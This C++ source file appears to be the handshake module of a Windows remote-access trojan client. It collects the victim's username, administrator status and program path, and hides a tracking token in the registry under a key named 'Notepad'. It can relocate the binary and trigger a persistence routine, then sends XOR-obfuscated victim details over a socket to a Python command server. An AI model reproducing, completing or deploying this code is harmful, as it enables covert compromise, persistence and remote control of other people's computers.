
#include "../inc/HandShake.h"
#include "../inc/Persistence.h"
#include "../inc/common.h"
#include "../inc/other.h"
#include "../inc/Exec.h"

using namespace  std;


HandShake::HandShake()
{
    a_name_user = setNameUser();
    a_is_admin = setIsAdmin();
    a_current_directory = setCurrentDirectory();
    a_name_prog = NAME_PROG;
    a_token = getTokenOrSetTokenInRegistry();

    a_location_prog = setLocationProg();
}


void HandShake::setSock(int sock)
{
    a_sock = sock;
}


void HandShake::beforeHandShake()
{
    if(AUTO_MOVE) 
    {
        moveProg();
    }
    a_location_prog = setLocationProg();
    
    if(AUTO_PERSISTENCE)
    {
        Persistence(a_is_admin, a_location_prog).main();
    }

}


void HandShake::startHandShake()
{
    // ' SPLIT ' for split data in python server.py script
    string is_admin;
    string end = "\r\n";

    if(a_is_admin)
    {
        //If admin
        is_admin = "MOD_HANDSHAKE_IS_ADMIN" SPLIT "True";
    }
    else
    {
        //if not admin
        is_admin = "MOD_HANDSHAKE_IS_ADMIN" SPLIT "False";
    }
    //cout << a_location_prog << endl;
    //cout << a_name_user << endl;
    string path_prog = "MOD_HANDSHAKE_PATH_PROG" SPLIT + a_location_prog;
    string name_user = "MOD_HANDSHAKE_NAME_USER"  SPLIT + a_name_user;
    string token = "MOD_HANDSHAKE_TOKEN" SPLIT + a_token;
   
    sendUltraSafe(a_sock, XOREncryption(is_admin));
    sendUltraSafe(a_sock, XOREncryption(path_prog));
    sendUltraSafe(a_sock,XOREncryption(name_user));
    sendUltraSafe(a_sock,XOREncryption(token));
    sendUltraSafe(a_sock,XOREncryption(end)); 
}
bool HandShake::setIsAdmin()
{
    vector <string> result;

    result = Exec().executeCommand("powershell.exe -command \"([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')\"");
    if(result[0].substr(0,4) == "True") //remove ruturn line.
    {
        //cout << "ADMIN IN setadmin: " << result.substr(0,4) << endl;
        return true;
    }
    else
    {
        //2 cout << "NOT ADMIN IN setadmin: " << result.substr(0,4) << endl;
        return false;
    }
}


string HandShake::setNameUser()
{

    TCHAR user[UNLEN+1];
    DWORD len_user = UNLEN+1;
    if(GetUserName(user,&len_user) == 0)
    {
        //if error
        return "Unknown";
    }
    else
    {
        string result(&user[0], &user[len_user]); //https://stackoverflow.com/questions/6291458/how-to-convert-a-tchar-array-to-stdstring
        //2 cout <<"name user: " <<result << endl;
        return result.substr(0,result.length()-1);    
    }
    
}


string HandShake::setCurrentDirectory()
{

    char buffer[PATHLEN];
    _getcwd(buffer,PATHLEN);
    if(buffer == NULL)
    {
        return "Unknown";
    }
    else
    {
        return (string) buffer;
    }
}


string HandShake::setLocationProg()
{
    char buffer[MAX_PATH];

    if(GetModuleFileNameA(NULL, buffer, sizeof(buffer)) == 0)//if error
    {   
        if(_getcwd(buffer,sizeof(buffer)) == 0)//if error
        {
            string result_cmd;
            return (string) result_cmd + "\\" + NAME_PROG;
        }
        else
        {
            return (string) buffer;
        }
    }
    else
    {
        return (string) buffer;        
    }
}


wstring HandShake::generateToken(const int token_size)//https://www.codespeedy.com/generate-random-hexadecimal-strings-in-cpp/
{
    wstring token;

    WCHAR hex_characters[]={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
    int i;


    srand(0); //https://stackoverflow.com/questions/1190689/problem-with-rand-in-c

    for(i=0;i< token_size;i++){token += hex_characters[rand()%16];}

    return token;
}


string HandShake::getTokenOrSetTokenInRegistry()
{
    wstring tmp_return;

    WCHAR name[] = L"config"; //name of string key.
    WCHAR token[128];

    LONG status; //allows to check the situation of the functions 
    HKEY hKey;

    DWORD lpType; //RegQueryValueExW
    WCHAR buffer[128]; //RegQueryValueExW lpData (token)
    DWORD lpcbData = sizeof(buffer); 

    //--------------------------------------------------------------------------------

    HKEY HKEY_admin_or_not = NULL;
    WCHAR path_of_key[64];

    //--------------------------------------------------------------------------------

    //Initialization of variables according to privileges. 
    if(a_is_admin) //test if admin | if admin set  HKEY_LOCAL_MACHINE else set HKCU
    {
        //if user is admin
        HKEY_admin_or_not = HKEY_LOCAL_MACHINE;
        wcscpy(path_of_key, L"SOFTWARE\\WOW6432Node\\Notepad");
    }
    else
    {
        //if user not admin
        HKEY_admin_or_not = HKEY_CURRENT_USER;
        wcscpy(path_of_key, L"Software\\WoW6432Node\\Notepad");
    }
    //--------------------------------------------------------------------------------

    //test if key exist (key = Notepad)
    status = RegOpenKeyExW(HKEY_admin_or_not, path_of_key, 0, KEY_ALL_ACCESS, &hKey); // RegOpenKeyEx(HKEY_LOCAL_MACHINE,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,KEY_ALL_ACCESS,
    if(status != 0) //ERROR_SUCCESS = 0
    {
        //KEY Notepad no exist  | create key and set token.
        //HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Notepad", 0, NULL,  REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey,&lpdwDisposition
        status = RegCreateKeyExW(HKEY_admin_or_not, path_of_key, 0, NULL,  REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey,NULL);
        if(status != 0)
        {
            //if If the notepad key has not been created.  
            ;
        }
        else
        {
            ;
            //cout << "[+] Key is create...." << endl;
        }
    }
    //cout << "[+] Key is open. " << endl;

    //get value (string)
    status = RegQueryValueExW(hKey, name ,NULL , &lpType, (LPBYTE) buffer , &lpcbData); 
    if(status != 0)
    {
        //string of key not found or token is not defined.
        ZeroMemory(&buffer, wcslen(buffer));


        wcscpy(token, generateToken(24).c_str()); //(data)
                
        //set key:
        status =  RegSetValueExW(hKey, name ,0, REG_SZ, (LPBYTE) token, lpcbData);
        if(status != 0)
        {
            //If an error lores the attribution of the token. (fuck windows)
            //cout << "FATAL ERROR" << endl;
            ;
        }
        //the token was well initialized.
    }

    else
    {
        tmp_return = buffer;
        return string(tmp_return.begin(), tmp_return.end());
    }

    RegCloseKey(hKey);

    tmp_return = token;
    string result(tmp_return.begin(), tmp_return.end());
    return result;
}


bool HandShake::getIsAdmin()
{
    return a_is_admin; //ghetter
}


string HandShake::getPathProg()
{
    //cout << "GetPathProg: " << a_location_prog << endl;
    return a_location_prog;
}


string HandShake::getNameUser()
{
    return a_name_user;
}

string HandShake::getToken()
{
    return a_token; 
}


void HandShake::moveProg()
{
   // Deplace le programme en fonction des privilèges de l'utilisateur.
    if(a_is_admin)
    {   
        if((rename(a_name_prog.c_str(), (a_location_prog).c_str())!=0))
        {   
            a_location_prog = a_current_directory + "\\" + a_name_prog; //if error
        }
    }
    else
    {
        //C:\Users\cisco\AppData\Roaming\Microsoft
        //if not adminW
        if((rename(a_name_prog.c_str(),(a_location_prog).c_str()))!= 0)
        {
            perror("Error in move prog ");  
            a_location_prog = a_current_directory + "\\" + a_name_prog; 
        }
    }
}
